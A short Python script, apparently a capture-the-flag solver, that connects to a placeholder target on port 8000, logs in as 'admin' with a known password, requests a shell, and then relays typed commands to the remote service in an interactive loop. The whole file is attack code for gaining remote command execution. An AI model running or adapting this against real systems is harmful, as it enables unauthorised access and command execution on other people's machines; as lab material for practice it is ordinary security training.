import socket

# Configuration
target_ip = "TARGET_IP"  # Target IP
target_port = 8000          # Target port
password = "abc123"         # Known password

def connect_and_interact():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))

        # Send 'admin' to the server
        client_socket.sendall(b'admin\n')

        # Receive the response from the server after sending 'admin'
        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")

        # Wait for the server to send "Password:"
        if "Password:" in response:
            print(f"Sending password: {password}")
            client_socket.sendall(password.encode() + b"\n")

            response = client_socket.recv(1024).decode()

            if "Welcome Admin!!!" in response:
                print(f"Server response for password '{password}': {response}")

                # Send 'shell' command after receiving the welcome message
                client_socket.sendall(b'shell\n')
                print("Sent 'shell' command. Waiting for shell response...")
                response = client_socket.recv(1024).decode()

                if response:
                    print(f"Shell response: {response}")
                    interact_with_shell(client_socket)
                else:
                    print("No response after sending 'shell'.")
            else:
                print(f"Unexpected response after password: {response}")

        else:
            print("Did not receive the 'Password:' prompt.")

    except Exception as e:
        print(f"Error during connection or communication: {e}")

    finally:
        if client_socket:
            client_socket.close()

def interact_with_shell(client_socket):
    try:
        while True:
            command = input("Enter command to execute: ")
            client_socket.sendall(command.encode() + b"\n")
            response = client_socket.recv(4096).decode()
            print(f"Response: {response}")

    except Exception as e:
        print(f"Error during interaction: {e}")

if __name__ == "__main__":
    connect_and_interact()
